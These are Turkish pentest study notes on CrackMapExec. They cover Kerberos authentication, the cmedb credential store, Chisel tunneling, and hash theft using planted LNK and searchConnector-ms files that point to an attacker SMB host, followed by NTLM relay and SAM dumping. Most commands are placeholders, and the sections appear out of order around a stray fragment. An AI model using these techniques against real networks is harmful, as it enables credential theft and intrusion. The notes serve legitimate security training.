Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


